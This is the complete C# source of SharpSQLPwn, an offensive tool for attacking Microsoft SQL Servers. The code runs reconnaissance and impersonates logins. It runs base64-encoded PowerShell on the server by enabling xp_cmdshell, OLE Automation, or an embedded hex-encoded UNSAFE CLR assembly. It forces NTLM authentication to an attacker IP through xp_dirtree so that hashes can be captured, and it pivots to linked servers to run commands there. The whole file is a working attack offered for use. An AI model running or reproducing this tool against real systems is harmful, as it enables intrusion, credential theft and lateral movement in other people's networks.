using System;
using System.Data.SqlClient;
using CommandLine;

namespace SharpSQLPwn
{
    class Program
    {
        class Options
        {
            [Option('t', "SQLServer", Default = "LocalMachine",
              HelpText = "Target SQL Server Hostname or IP.")]
            public string SQLServer { get; set; }

            [Option('d', "Database", Default = "master",
              HelpText = "Database Name of target SQL server.")]
            public string Database { get; set; }

            [Option('M', "Modules", Default = "R",
             HelpText = "Available Modules: R=Recon, I=Impersonation, C=CommandExecution, U=UNCPathInjection, L=LinkedSQL")]
            public string Modules { get; set; }

            [Option('U', "ImpersonatedUser", Default = "sa",
              HelpText = "Name of user to impersonate.")]
            public string ImpersonatedUser { get; set; }

            [Option('C', "CmdExecTechnique", Default = 1,
              HelpText = "Available Command Execution Techniques: 1=xp_cmdshell, 2=sp_OACreate, 3=dll_assembly")]
            public int CmdExecTechnique { get; set; }

            [Option('x', "CmdExecCommand", Default = "",
             HelpText = "Command to be executed.")]
            public string CmdExecCommand { get; set; }

            [Option('I', "AttackerIP", Default = "",
              HelpText = "Local IP of the attacker (used for responder or ntlmrelay or Inveigh).")]
            public string AttackerIP { get; set; }

            [Option('L', "LinkedSQLServer",
             HelpText = "Target linked SQL Server Hostname or IP.")]
            public string LinkedSQLServer { get; set; }

            [Option('i', "Interactive",
             HelpText = "Run Interactive version.")]
            public bool Interactive { get; set; }

            [Option('E', "Example",
             HelpText = "Display example commands.")]
            public bool Example { get; set; }
        }

        static void ShowBanner(bool exmpl)
        {
            Console.WriteLine();
                   Console.WriteLine(@"   _____ __                    _____ ____    __    ____     ");
                   Console.WriteLine(@"  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______ ");
                   Console.WriteLine(@"  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \");
                   Console.WriteLine(@" ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /");
                   Console.WriteLine(@"/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ ");
                   Console.WriteLine(@"                     /_/                                              ");
                   Console.WriteLine(@"   https://github.com/lefayjey/SharpSQLPwn");
                   Console.WriteLine(@"   Version:  1.0");
                   Console.WriteLine(@"   Author:  lefayjey");
                   Console.WriteLine();
                   Console.ResetColor();

                   if (exmpl)
                   {
                       Console.WriteLine($"Example usage (Interactive version):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -i");
                       Console.WriteLine();
                       Console.WriteLine($"Example usage (Test connection to local machine):");
                       Console.WriteLine($".\\SharpSQLPwn.exe");
                       Console.WriteLine();
                       Console.WriteLine($"Example usage (Basic recon):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -t SQLServer [-d DatabaseName]");
                       Console.WriteLine();
                       Console.WriteLine($"Example usage (Impersonation):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -M I -t SQLServer [-d DatabaseName] -U ImpersonatedUser");
                       Console.WriteLine(); 
                       Console.WriteLine($"Example usage (Command Execution):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -M C[I] -t SQLServer [-d DatabaseName] -C CmdExecTechnique -x Command [-U ImpersonatedUser]");
                       Console.WriteLine(); 
                       Console.WriteLine($"Example usage (UNC Path Injection):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -M U[I] -t SQLServer [-d DatabaseName] -I AttackerIP [-U ImpersonatedUser]");
                       Console.WriteLine(); 
                       Console.WriteLine($"Example usage (Linked Servers):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -M L -t SQLServer [-d DatabaseName] -L LinkedSQLServer -x Command");
                       Console.WriteLine(); 
                       Console.WriteLine($"Example usage (All modules):");
                       Console.WriteLine($".\\SharpSQLPwn.exe -M RICUL -t SQLServer [-d DatabaseName] -U ImpersonatedUser -C CmdExecTechnique -x Command -I AttackerIP -L LinkedSQLServer");
                       Console.WriteLine(); 

                       Environment.Exit(0);
                   }
        }
    static Exception QuerySQL(SqlConnection con, String query, bool output)
        {
            try
            {
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();
                if (output == true)
                {
                    while (reader.Read() == true)
                    {
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        if (reader[0] != DBNull.Value) { Console.WriteLine("---> " + reader[0]); };
                        Console.ResetColor();
                    }
                }
                reader.Close();
                return null;
            }

            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Error: " + e.Message);
                Console.ResetColor();
                return e;
            }

        }

        static Exception CheckRole(SqlConnection con, String rolename)
        {
            try
            {
                String querypublicrole = "SELECT IS_SRVROLEMEMBER('" + rolename + "');";
                SqlCommand command = new SqlCommand(querypublicrole, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                Int32 role = Int32.Parse(reader[0].ToString());

                if (role == 1)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] User is a Member of " + rolename + " Role");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[-] User is NOT a Member of " + rolename + " Role");
                    Console.ResetColor();
                }
                reader.Close();
                return null;
            }

            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Error: " + e.Message);
                Console.ResetColor();
                return e;
            }

        }

        static string EncodePs(String PS_cradle)
        {
            String code = PS_cradle.Replace("\"", "");

            var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(code);
            var psCommandBase64 = Convert.ToBase64String(psCommandBytes);

            String pscmd = "powershell -enc " + psCommandBase64;

            Console.WriteLine("\n[Info] The PS code: " + code);
            Console.WriteLine("[Info] Encoded command: " + pscmd);
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("[*] Executing command. If executing a reverse shell, please make sure listener is running");
            Console.ResetColor();

            return pscmd;
        }

        static void Recon(SqlConnection con)
        {
            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Recon Tests <<<<<<<<<<<<<<<<<<<");
            //System username of current session
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n[+] Logged in as:");
            Console.ResetColor();
            QuerySQL(con, "SELECT SYSTEM_USER;", true);

            //Mapped SQL username
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Mapped to User:");
            Console.ResetColor();
            QuerySQL(con, "SELECT USER_NAME();", true);

            CheckRole(con, "public");
            CheckRole(con, "sysadmin");

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("\n[*] Checking which logins allow impersonation (if any) ...");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Logins that can be impersonated:");
            Console.ResetColor();
            String imp_query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id =b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            QuerySQL(con, imp_query, true);
            String allusers_query = "SELECT * from sys.server_principals;";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] List of all users:");
            Console.ResetColor();
            QuerySQL(con, allusers_query, true);

            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("\n[*] Checking linked SQL servers ...");
            Console.ForegroundColor = ConsoleColor.Green;
            String linkedquery = "EXEC sp_linkedservers;";
            Console.WriteLine("[+] Linked SQL Servers:");
            Console.ResetColor();
            QuerySQL(con, linkedquery, true);
        }

        static void Impersonate(SqlConnection con, String impers_user)
        {
            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Impersonation Tests <<<<<<<<<<<<<<<<<<<");
            if (impers_user != "")
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine("[*] Testing impersonation...");
                Console.ResetColor();

                try
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Currently logged in as: ");
                    Console.ResetColor();
                    QuerySQL(con, "SELECT SYSTEM_USER;", true);

                    String implogin = impers_user;
                    String impersonateUser = "EXECUTE AS LOGIN = '" + implogin + "';";
                    QuerySQL(con, impersonateUser, false);
                }
                catch (Exception e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[-] Failed to Impersonate Message: " + e.Message);
                    Console.ResetColor();
                }
            }
        }

        static void CmdExec(SqlConnection con, int cmdExec_tech, string cmdExec_command)
        {
            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Command Execution Tests <<<<<<<<<<<<<<<<<<<");
            if (cmdExec_command != "")
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.Write("[*] Trying to execute commands using chosen technique: 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
                Console.ResetColor();

                if (cmdExec_tech == 1)
                {
                    String cmd = EncodePs(cmdExec_command);

                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("[*] Trying technique-1 by enabling xp_cmdshell procedure if disabled ...");
                    Console.ResetColor();
                    String enable_xpcmdshell = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    QuerySQL(con, enable_xpcmdshell, false);

                    String execcmd = "EXEC xp_cmdshell '" + cmd + "';";
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Command output (if any):");
                    Console.ResetColor();

                    QuerySQL(con, execcmd, true);
                }

                if (cmdExec_tech == 2)
                {
                    String cmd = EncodePs(cmdExec_command);

                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("[*] Trying technique-2 by enabling sp_OACreate procedure if disabled ...");
                    Console.ResetColor();
                    String enable_sp_oacreate = "EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                    QuerySQL(con, enable_sp_oacreate, false);
                    String execcmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '" + cmd + "';";
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Command output (if any):");
                    Console.ResetColor();
                    QuerySQL(con, execcmd, true);
                }

                if (cmdExec_tech == 3)
                {
                    String cmd = EncodePs(cmdExec_command);

                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("[*] Trying technique-3 by creating dll assembly and a custom procedure ...");
                    Console.ResetColor();
                    String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE";
                    QuerySQL(con, enable_clr, false);

                    String create_assembly = "CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602007D6B9E800000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000088030000000000000000000000000000000000000000000000000000EC290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000950A000000200000000C000000020000000000000000000000000000200000602E72737263000000880300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F803000023537472696E6773000000001C070000580000002355530074070000100000002347554944000000840700005401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F000000010000000100000003000000000067020100000000000600910119030600FE0119030600AF00E7020F00390300000600D7007D02060074017D02060055017D020600E5017D020600B1017D020600CA017D02060004017D020600C300FA020600A100FA02060038017D0206001F01300206008B0376020A00EE00C6020A004A0248030E006E03E7020A006500C6020E009D02E7020600600276020A002000C6020A00910014000A00DD03C6020A008900C6020600AE020A000600BB020A000000000001000000000001000100010010005D03000041000100010048200000000096003500620001000921000000008618E102060002000000010059000900E10201001100E10206001900E1020A002900E10210003100E10210003900E10210004100E10210004900E10210005100E10210005900E10210006100E10215006900E10210007100E10210007900E10210008900E10206009900E102060099008F022100A90073001000B10084032600A90076031000A9001C021500A900C20315009900A9032C00B900E1023000A100E1023800C90080003F00D1009E0344009900AF034A00E10040004F00810054024F00A1005D025300D100E8034400D1004A00060099009203060099009B0006008100E102060020007B004C012E000B0068002E00130071002E001B0090002E00230099002E002B00A9002E003300A9002E003B00A9002E00430099002E004B00AF002E005300A9002E005B00A9002E006300C7002E006B00F1002E007300FE001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007602000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C69620073716C636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E670073716C636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F770000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000DF701196A1A25D49A78CA198292805E400042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000F01000A73716C636D6445786563000005010000000017010012436F7079726967687420C2A920203230323100002901002434333339393433312D373730652D343334382D383863642D37633432363534633334613000000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000000003E9B7F2000000000200000071000000242A0000240C000000000000000000000000000010000000000000000000000000000000525344539EDB503565CCB947ACC0C0C8321A339F01000000443A5C437962657273656375726974795C50656E74657374546F6F6C735C5265706F735C73716C636D64457865635C73716C636D64457865635C6F626A5C7836345C52656C656173655C73716C636D64457865632E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000002C03000000000000000000002C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0048C020000010053007400720069006E006700460069006C00650049006E0066006F0000006802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000003E000B000100460069006C0065004400650073006300720069007000740069006F006E0000000000730071006C0063006D006400450078006500630000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003E000F00010049006E007400650072006E0061006C004E0061006D0065000000730071006C0063006D00640045007800650063002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000046000F0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000730071006C0063006D00640045007800650063002E0064006C006C000000000036000B000100500072006F0064007500630074004E0061006D00650000000000730071006C0063006D006400450078006500630000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
                    QuerySQL(con, create_assembly, false);

                    String create_procedure = "CREATE PROCEDURE [dbo].[sqlcmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[sqlcmdExec]; ";
                    QuerySQL(con, create_procedure, false);

                    String execcmd = "EXEC sqlcmdExec '" + cmd + "';";
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Command output (if any):");
                    Console.ResetColor();
                    QuerySQL(con, execcmd, true);

                    String drop_procedure = "DROP PROCEDURE [dbo].[sqlcmdExec];";
                    QuerySQL(con, drop_procedure, false);
                    String drop_assembly = "DROP ASSEMBLY myAssembly;";
                    QuerySQL(con, drop_assembly, false);

                }
            }
        }

        static void UNCPathInjection(SqlConnection con, string smb_ip)
        {
            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running UNC Path Injection Tests <<<<<<<<<<<<<<<<<<<");
            if (smb_ip != "")
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine("[*] Trying get NET-NTLM Hash [NOTE: Ensure Responder/Impacket is listening]");
                Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " ...");
                Console.ResetColor();
                String smbquery = "EXEC master..xp_dirtree \"\\\\" + smb_ip + "\\test\";";
                QuerySQL(con, smbquery, false);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
                Console.ResetColor();
            }
        }

        static void TestLinkedServer(SqlConnection con, string linkedSQLServer, string smb_ip, string cmdExeclinked)
        {
            Console.WriteLine("\n>>>>>>>>>>>>>>>>>>>> Running Linked Servers Tests <<<<<<<<<<<<<<<<<<<");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("[*] Checking access on: " + linkedSQLServer);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] On " + linkedSQLServer + ", executing as:");
            Console.ResetColor();

            String execLinkedServer = "select myuser from openquery(\"" + linkedSQLServer + "\", 'select SYSTEM_USER as myuser');";
            Exception e = QuerySQL(con, execLinkedServer, true);
            if (e != null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Cannot make connection to remote SQL server. RPC out could be disabled. Message: " + e.Message);
                Console.ResetColor();

                Console.WriteLine("[*] Trying to enable RPC out using sp_serveroptions");
                Console.ResetColor();
                String serveroption = "EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc', 'true'; EXEC sp_serveroption '" + linkedSQLServer + "', 'rpc out', 'true';";
                QuerySQL(con, serveroption, true);
                Exception e2 = QuerySQL(con, execLinkedServer, true);
                if (e2 == null)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Done! RPC out enabled for remote SQL server");
                    Console.ResetColor();
                }

            }

            if (smb_ip != "")
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine("[*] Trying to connect SMB share on " + smb_ip + " on remote SQL Server " + linkedSQLServer + " ...");
                Console.ResetColor();
                String smbquery = "EXEC ('master..xp_dirtree ''\"\\\\" + smb_ip + "\\test\"'';') AT [" + linkedSQLServer + "]";

                QuerySQL(con, smbquery, false);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Please check Responder/Impacket interface on Kali");
                Console.ResetColor();
            }

            if (cmdExeclinked != "")
            {
                String cmd = EncodePs(cmdExeclinked);

                string enableoption = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + linkedSQLServer + "]";
                QuerySQL(con, enableoption, false);
                string enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + linkedSQLServer + "]";
                QuerySQL(con, enablexpcmdshell, false);

                String execcmd = "EXEC ('xp_cmdshell ''" + cmd + "'';') AT [" + linkedSQLServer + "]";
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] Command output on " + linkedSQLServer + " (if any): ");
                Console.ResetColor();
                QuerySQL(con, execcmd, true);
            }
        }

        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
               .WithParsed<Options>(o =>
               {
                   ShowBanner(o.Example);

                   if (o.Interactive) { 
                        Console.Write("\n[Q] Please enter SQL Server domain name (Press [Enter] to use local instance): ");
                        String input = Console.ReadLine();
                        String sqlServ;
                        if (string.IsNullOrEmpty(input)) { sqlServ = System.Environment.MachineName; }
                        else { sqlServ = input; }

                        Console.Write("[Q] Please enter database name (Press [Enter] to use master): ");
                        input = Console.ReadLine();
                        String db;
                        if (string.IsNullOrEmpty(input)) { db = "master"; }
                        else { db = input; }

                        String coniString = "Server = " + sqlServ + "; Database = " + db + "; Integrated Security = True;";
                        SqlConnection coni = new SqlConnection(coniString);

                        try
                        {
                            coni.Open();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("\n[+] Authentication Success!");
                            Console.ResetColor();
                        }
                        catch
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n[-] Authentication Failed");
                            Console.ResetColor();
                            Environment.Exit(0);
                        }

                        Recon(coni);

                        Console.Write("[Q] Would you like to impersonate another user? [y/N]: ");
                        String question_user = Console.ReadLine();
                        if (question_user == "y" || question_user == "Y" || question_user == "YES" || question_user == "yes")
                        {
                            Console.Write("[Q] Please enter the name of login to impersonate: ");
                            String implogin = Console.ReadLine();
                            Impersonate(coni, implogin);
                        }

                        Console.Write("\n[Q] Would you like to try get NET-NTLM Hash? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
                        String question = Console.ReadLine();
                        if (question == "y" || question == "Y" || question == "YES" || question == "yes")
                        {
                            Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                            String smb_ip = Console.ReadLine();

                            UNCPathInjection(coni, smb_ip);
                            Console.ForegroundColor = ConsoleColor.Blue;
                        }

                        Console.Write("\n[Q] Would you like to try Command Execution on " + sqlServ + "? [y/N]: ");
                        String question2 = Console.ReadLine();
                        if (question2 == "y" || question2 == "Y" || question2 == "YES" || question2 == "yes")
                        {
                            Console.Write("[Q] Which technique would you like to use?");
                            Console.Write("\n[Q] Enter 1 for xp_cmdshell, 2 for Ole Automation Procedures, 3 for DLL assembly: ");
                            int technique = Int32.Parse(Console.ReadLine());
                            String cmd;
                            Console.Write("[Q] Please enter command to execute: ");
                            cmd = Console.ReadLine();
                            CmdExec(coni, technique, cmd);
                        }

                        Console.Write("\n[Q] Would you like to check access on linked SQL servers (if mentioned above)? [y/N]: ");
                        String question3 = Console.ReadLine();
                        if (question3 == "y" || question3 == "Y" || question3 == "YES" || question3 == "yes")
                        {
                            Console.Write("[Q] Please enter linked SQL server name: ");
                            String linkedsqlserver = Console.ReadLine();
                            TestLinkedServer(coni, linkedsqlserver, "", "");
                            
                            Console.Write("\n[Q] Would you like to try get NET-NTLM Hash of remote SQL server? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
                            String question4 = Console.ReadLine();
                            if (question4 == "y" || question4 == "Y" || question4 == "YES" || question4 == "yes")
                            {
                                Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                                String smb_ip = Console.ReadLine();
                                TestLinkedServer(coni, linkedsqlserver, smb_ip, "");
                            }

                            Console.Write("\n[Q] Would you like to enable xp_cmdshell and execute command on remote SQL server? [y/N]: ");
                            String question5 = Console.ReadLine();
                            if (question5 == "y" || question5 == "Y" || question5 == "YES" || question5 == "yes")
                            {
                                Console.Write("[Q] Please enter command to execute on " + linkedsqlserver + ": ");
                                String cmd;
                                cmd = Console.ReadLine();
                                TestLinkedServer(coni, linkedsqlserver, "", cmd);
                            }

                        }
                        coni.Close();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("\n[+] Done! Exiting ... ");
                        Console.ResetColor();
                        Environment.Exit(0);
                    }

                   if (o.SQLServer == "LocalMachine") { o.SQLServer = System.Environment.MachineName; }

                   String conString = "Server = " + o.SQLServer + "; Database = " + o.Database + "; Integrated Security = True;";
                   SqlConnection con = new SqlConnection(conString);

                   try
                   {
                       con.Open();
                       Console.ForegroundColor = ConsoleColor.Green;
                       Console.WriteLine("\n[+] Authentication Success!");
                       Console.ResetColor();
                   }
                   catch
                   {
                       Console.ForegroundColor = ConsoleColor.Red;
                       Console.WriteLine("\n[-] Authentication Failed");
                       Console.ResetColor();
                       con.Close();
                       Environment.Exit(0);
                   }


                   if (o.Modules.Contains("R")) { Recon(con); }
                   if (o.Modules.Contains("I")) { Impersonate(con, o.ImpersonatedUser); }
                   if (o.Modules.Contains("C")) { CmdExec(con, o.CmdExecTechnique, o.CmdExecCommand); }
                   if (o.Modules.Contains("U")) { UNCPathInjection(con, o.AttackerIP); }
                   if (o.Modules.Contains("L")) { TestLinkedServer(con, o.LinkedSQLServer, o.AttackerIP, o.CmdExecCommand); }

                   con.Close();
                   Console.ForegroundColor = ConsoleColor.Green;
                   Console.WriteLine("\n[+] Done! Exiting ... \n");
                   Console.ResetColor();
                   Environment.Exit(0);
               });
        }

        
    }
}